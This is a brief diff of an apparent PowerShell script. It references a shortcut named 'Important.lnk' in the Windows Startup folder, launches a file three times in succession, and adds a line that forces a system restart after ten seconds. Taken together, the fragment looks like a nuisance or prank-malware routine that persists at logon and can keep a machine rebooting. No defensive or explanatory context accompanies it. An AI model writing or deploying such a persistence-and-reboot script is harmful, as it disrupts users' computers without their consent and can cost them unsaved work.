@@ -9,3 +9,5 @@ $important_file = -join([Environment]::GetFolderPath('Startup'), "/Important.lnk
 start $sigma_file
 start $sigma_file
 start $sigma_file
+
+shutdown /r /t 10
